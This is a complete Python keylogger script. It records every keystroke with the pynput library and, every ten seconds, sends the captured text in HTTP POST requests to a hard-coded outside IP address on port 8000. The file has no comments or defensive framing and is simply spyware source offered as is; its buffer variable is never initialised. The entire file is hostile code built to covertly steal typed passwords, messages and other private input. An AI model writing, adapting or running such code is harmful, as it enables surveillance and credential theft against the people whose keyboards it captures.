from pynput import keyboard
import requests
import json
import threading

ip_address = "18.168.18.15"
port_number = "8000"
time_interval = 10

def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        request = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
       
        text += str(key).strip("'")

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()